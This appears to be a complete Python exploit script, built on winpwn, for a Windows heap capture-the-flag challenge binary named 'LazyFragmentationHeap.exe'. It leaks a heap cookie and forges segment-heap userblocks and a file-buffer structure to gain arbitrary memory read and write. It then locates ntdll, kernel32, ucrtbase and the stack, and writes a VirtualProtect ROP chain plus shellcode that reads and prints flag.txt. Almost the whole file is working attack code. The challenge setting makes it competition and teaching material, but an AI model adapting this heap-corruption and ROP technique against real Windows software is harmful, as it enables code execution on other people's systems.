from winpwn import *
import time
ru=lambda s:r.recvuntil(s)
sd=lambda s:r.send(str(s))
rn=lambda n:r.recvn(n)
rl=lambda:r.recvuntil('\n')
sl=lambda s:r.sendline(str(s))

def asm(asmcode):
    fp=open('./asmcode.txt','wb')
    fp.write(asmcode)
    fp.close()
    print("asming")
    pause()
    fp=open("./machinecode.txt",'rb')
    buf=fp.read(0x1000)
    return buf
def allocate(size,idx):
    r.recvuntil("choice: ")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(str(idx))

def edit(idx,data):
    r.recvuntil("choice: ")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.send(data)

def show(idx):
    r.recvuntil("choice: ")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def free(idx):
    r.recvuntil("choice: ")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

def openfile():
    r.recvuntil("choice: ")
    r.sendline("5")
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline("3")

def readfile(idx,size,ret=True):
    r.recvuntil("choice: ")
    r.sendline("5")
    r.recvuntil("choice: ")
    time.sleep(0.1)
    r.sendline("2")
    time.sleep(0.1)
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    time.sleep(0.1)
    r.sendline(str(size))
    if ret :
        r.recvuntil("choice: ")
        r.sendline("3")


def debugf(cmd=''):
    windbgx.attach(r,cmd)

def exp(addr=None,heapoff=0x2c0,is_attach=False,is_leak=True):
    global is_continue
    allocate(0x228,1)
    allocate(0x228,2)
    edit(1,'a'*0x228)
    show(1)
    rn(9)
    rn(0x228)
    cookie=u64(rl().strip('\r\n').ljust(8,'\x00'))
    if cookie==0:
        raise Exception
    cookie=cookie^0x2322010023

    allocate(0x228,3)
    allocate(0x228,4)
    allocate(0x1000,5)
    allocate(0x228,6)
    l1=u8(p64(cookie)[0])
    l2=u8(p64(cookie)[1])
    l3=u8(p64(cookie)[2])
    l4=u8(p64(cookie)[3])^(l1^l2^l3)
    fake_id=l4<<24
    fake_id=cookie^0x2323000023
    # allocate(0x228,fake_id)
    allocate(0x228,fake_id)

    
    for i in range(17):
        openfile()

    readfile(3,0x228)
    edit(3,'a'*0x228+p64(cookie^0x236a01016a)[0:6])
    allocate(0x1400,8)
    free(4)
    print('cookie: ',hex(cookie))
    allocate(0x228,4)

    show(5)
    ru("Content: ")
    heap_addr=u64(rl().strip('\r\n').ljust(0x8,'\x00'))
    if heap_addr==0:
        raise Exception
    heap=heap_addr-0x150
    var=heap_addr
    print("heap addr: ",hex(heap_addr))
    while(var==heap_addr):
        openfile()
        show(5)
        ru("Content: ")
        var=u64(rl().strip('\r\n').ljust(0x8,'\x00'))
    print('cookie: ',hex(cookie))

    if is_leak is True:
        buf=0xbeefdad0000+0x20
    else:
        buf=0xbeefdad0000+0x48
    def fake_userblocks(buf):
        SubSegment=p64(heap+0xbd60)
        Reserved=p64(heap+0xd4f0)
        SizeIndexAndPadding=p32(0xc) # p32
        Signature=p32(0xf0e0d0c0)
        fake_userblocks_header=SubSegment+Reserved+SizeIndexAndPadding+Signature+p64(0)*5
        ptr = buf
        base = buf
        cnt = 0
        flag = 0x2049
        fd = 0
        pad = 0
        bufsize = 0x800
        fake_iobuf = p64(0)*2 + p64(ptr) + p64(base) + p32(cnt) + p32(flag) + p32(fd) + p32(pad) + p64(bufsize) + p64(0)
        fake_iobuf += p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2
        return fake_userblocks_header+fake_iobuf*0x28
     
    edit(5,fake_userblocks(buf))
    readfile(2,8,ret=False) # read a addr to heap[0] heap[1]

    if is_leak:
        if addr:
            addr2leak=addr
        elif heapoff:
            addr2leak=heap+heapoff
        else:
            addr2leak=heap+0x2c0       # leak ntdll
        sd(p64(addr2leak))
        ru("choice: ")
        sl("3")
        show(1)
        ru("Content: ")
        leak_addr=u64(ru('\n').strip('\r\n').ljust(8,'\x00'))
        return leak_addr
    else:
        sd(p64(heap+pioinfo_off+0x38))
        ru("choice: ")
        sl("3")
        edit(2,p8(9))
        sleep(1)
        allocate(0x458,9)  # same with 6,7
        free(6)
        allocate(0x228,6)
        target=0xbeefdad0000+0x20+0x28*6

        edit(9,'a'*0x228+p64(cookie^0x2323000023)+p64(target-8)+p64(target))
        allocate(0x228,10)            # unlink
        
        def ele(id,ptr,size=0x100):
            payload=p64(0xddaabeef1acd)
            payload+=p64(size)
            payload+=p64(id)
            payload+=p64(0xddaabeef1acd)
            payload+=p64(ptr)
            return payload
        payload=p64(0)
        payload+=ele(8,0xbeefdad0118)      # 8 can change itself
        edit(fake_id,payload)

        # if is_attach:  
        #     cmd=''
        #     cmd+="? ucrtbase!_pioinfo;? poi(ucrtbase!_pioinfo);"
        #     cmd+='!heap;'
        #     cmd+='? ucrtbase!_pioinfo;'
        #     cmd+='? poi(ucrtbase!_pioinfo);'
        #     cmd+='.echo {};'.format(hex(pioinfo_off))
        #     is_continue=False
        #     debugf(cmd)

        def readmem(addr):
            payload=ele(8,0xbeefdad0118)
            payload+=ele(9,0xbeefdad0118)
            payload+=ele(10,addr)
            edit(8,payload)
            show(10)
            ru("Content: ")
            addr=u64(rl().strip('\r\n')[:8].ljust(0x8,'\x00'))
            payload=ele(8,0xbeefdad0118)
            payload+=ele(9,0xbeefdad0118)
            edit(9,payload)
            return addr
        def writemem(addr,content,is_pause=False):
            payload=ele(8,0xbeefdad0118,)
            payload+=ele(9,0xbeefdad0118)
            payload+=ele(10,addr)
            edit(8,payload)
            payload=ele(8,0xbeefdad0118)
            payload+=ele(9,0xbeefdad0118)
            edit(9,payload)
            if is_pause:
                pause()
            edit(10,content)

        imoml=readmem(PebLdr+0x20)
        proc_base=readmem(imoml+0x28)-0x1bf0
        kernel32=readmem(proc_base+0x3020)-0x15ae0
        peb=readmem(PebLdr-0x38)-0x340
        teb=peb+0x1000
        stack=readmem(teb+0x10+1)<<8
        # if is_attach:  
        #     cmd=''
        #     cmd+="? ucrtbase!_pioinfo;? poi(ucrtbase!_pioinfo);"
        #     cmd+='!heap;'
        #     cmd+='? ucrtbase!_pioinfo;'
        #     cmd+='? poi(ucrtbase!_pioinfo);'
        #     cmd+='.echo {};'.format(hex(pioinfo_off))
        #     is_continue=False
        #     debugf(cmd)
        main_ret=proc_base+0x1B78

        # r.interactive()
        stack_main_ret=stack+0x2ff8
        while(stack_main_ret>stack):
            get_addr=readmem(stack_main_ret)
            if get_addr==main_ret:
                break
            stack_main_ret=stack_main_ret-8
        stack_read_ret=stack_main_ret-0x80

        writemem(0xBEEFDAD0000+0x200,'flag.txt\x00')
        
        if is_attach:  
            cmd=''
            cmd+="? ucrtbase!_pioinfo;? poi(ucrtbase!_pioinfo);"
            cmd+='!heap;'
            cmd+='? ucrtbase!_pioinfo;'
            cmd+='? poi(ucrtbase!_pioinfo);'
            cmd+='.echo {};'.format(hex(pioinfo_off))
            cmd+='bp 0xBEEFDAD0000+0x500+1;'
            is_continue=False
            debugf(cmd)

        main_ret=proc_base+0x1B78
        pop_rdx_rcx_r8_r9_r10_r11=ntdll+0x8fb10
        def call(func,rcx,rdx,r8,r9):
            rop=p64(pop_rdx_rcx_r8_r9_r10_r11)
            rop+=p64(rdx)
            rop+=p64(rcx)
            rop+=p64(r8)
            rop+=p64(r9)
            rop+=p64(0)
            rop+=p64(0)
            rop+=p64(func)
            return rop

        VirtualProtect=kernel32+0x1B410
        HeapCreate=kernel32+0x1EA10
        CrtHeap=ucrtbase+0xeb550      # ucrtbase!_acrt_heap
        ProcessHeap=peb+0x30

        WinExec=kernel32+0x5f1a0
        _open=ucrtbase+0xa2a30
        _read=ucrtbase+0x16270
        _write=ucrtbase+0x15bf0
        _exit=ucrtbase+0x1fed0
        _sleep=ucrtbase+0xb19d0
        _exit=ucrtbase+0x1fed0
        shellcode=asm(
        """
            xor rcx,rcx;
            xor rdx,rdx;
            xor r8,r8;
            xor r9,r9;
            xor rdi,rdi;
            mov cl,2;
            mov rdi,{HeapCreate};
            call rdi;

            mov rdi,{ProcessHeap};
            mov qword ptr [rdi],rax;
            mov rdi,{CrtHeap};
            mov qword ptr [rdi],rax;
            sub rsp,0x1000;
            open:
                mov rdi,{_open};
                mov rcx,{filename};
                xor rdx,rdx
                call rdi

            read:
                mov rcx,rax;
                mov rdx,{buf};
                mov rdi,{_read};
                mov r8,0x40;
                call rdi;
            write :
                mov r8,rax;
                mov rdx,{buf}
                xor rcx,rcx;
                inc rcx;
                mov rdi,{_write};
                call rdi;
            sleep:
                mov rcx,20;
                mov rdi,{_sleep};
                call rdi;
            exit:
                mov rdi,{_exit};
                call rdi
        """.format(
                HeapCreate=hex(HeapCreate),
                ProcessHeap=hex(ProcessHeap),
                CrtHeap=hex(CrtHeap),
                _open=hex(_open),
                _read=hex(_read),
                _write=hex(_write),
                filename=hex(0xBEEFDAD0000+0x200),
                buf=hex(0xBEEFDAD0000),
                _sleep=hex(_sleep),
                _exit=hex(_exit)
            )
        )
        rop=call(VirtualProtect,0xBEEFDAD0000,0x1000,0x40,0xBEEFDAD0000)
        rop+=p64(0xBEEFDAD0000+0x500+1)
        writemem(0xBEEFDAD0000+0x500,'\x90'+shellcode)
        writemem(stack_read_ret,rop,is_pause=False)
        print('imoml: ',hex(imoml))
        print('kernel32: ',hex(kernel32))
        print('teb',hex(teb))
        print('stack: ',hex(stack))
        print('stack_main_ret',hex(stack_main_ret))
        print('stack_read_ret',hex(stack_read_ret))
        hexdump(shellcode)

context.arch='amd64'
# context.log_level='debug'
context.windbgx="windbgx"
context.dbginit=".load Z:\\sharedir\\building\\bywin\\pykd_ext_2.0.0.24\\x64\\pykd.dll;!py -g Z:\\sharedir\\building\\bywin\\byinit.py;"
context.nocolor=1
context.timeout=3
context.tick=1
# context.log_level='debug'
binpath='./LazyFragmentationHeap.exe'
is_continue=True
r=None

ntdll=0x7ffca3350000
imoml_off=0x28c0
PebLdr=ntdll+0x001653a0
ucrtbase=0x7ffca03a0000
pioinfo_off=0x6d90

PebAddr=0 # 0x295000
TebAddr=0 # PebAddr+0xb000
BinBase=0

def leak_ntdll():
    global ntdll
    global r
    while(1):
        try:
            if ntdll==0:
                r=process(binpath)
                ntdll=exp(is_attach=False,is_leak=True)-0x163cb0
                r.close()
                print('ntdll',hex(ntdll))
            break
        except:
            r.close()
            if is_continue is False:
                break
def leak_imomloff():
    global imoml_off
    global r
    while(1):
        try:
            if PebAddr==0x001653a0:
                quit()
            if imoml_off==0:
                r=process(binpath)
                imoml_off=exp(addr=PebLdr+0x20,is_attach=False,is_leak=True)&0xffff
                r.close()
                print("imoml_off: ",hex(imoml_off))
                if imoml_off==0:
                    continue
            break
        except:
            r.close()
def leak_ucrtbase():
    global ucrtbase
    global r
    global r1
    global r2
    while(1):
        try:
            if imoml_off==0:
                quit()
            if ucrtbase==0:
                r1=process(binpath)
                r2=process(binpath)
                r=r1
                BinBase = exp(None,imoml_off+0x28,is_attach=False,is_leak=True) - 0x1bf0
                r1.close()
                print('bin base: ',hex(BinBase))
                r=r2
                ucrtbase=exp(BinBase+0x30A0,None,is_attach=False,is_leak=True)-0x19620
                # gc.collect()
                r2.close()
                print("ucrtbase: ",hex(ucrtbase))
            break
        except:
            r1.close()
            r2.close()
def leak_pioinfo_off():
    global pioinfo_off
    global r
    while(1):
        try:
            if ucrtbase==0:
                quit()
            if pioinfo_off==0:
                r=process(binpath)
                pioinfo_off=exp(ucrtbase+0xeb750,None,is_attach=False,is_leak=True)&0xffff
                print("pioinfo_off: ",hex(pioinfo_off))
                r.close()
                # r.interactive()
            if pioinfo_off==0:
                continue
            break
        except:
            r.close()
            if not is_continue:
                break
leak_ntdll()
PebLdr=ntdll+0x001653a0
leak_imomloff()
leak_ucrtbase()
leak_pioinfo_off()

def attack():
    global r
    while(1):
        try:
            r=process(binpath)
            exp(None,None,is_attach=True,is_leak=False)
            r.interactive()
            break
        except SyntaxError:
            print('syn error')
            break
        except NameError:
            print("NameError")
            break
        except Exception as e:
            print(e)
            r.close()
            if is_continue is False:
                break
attack()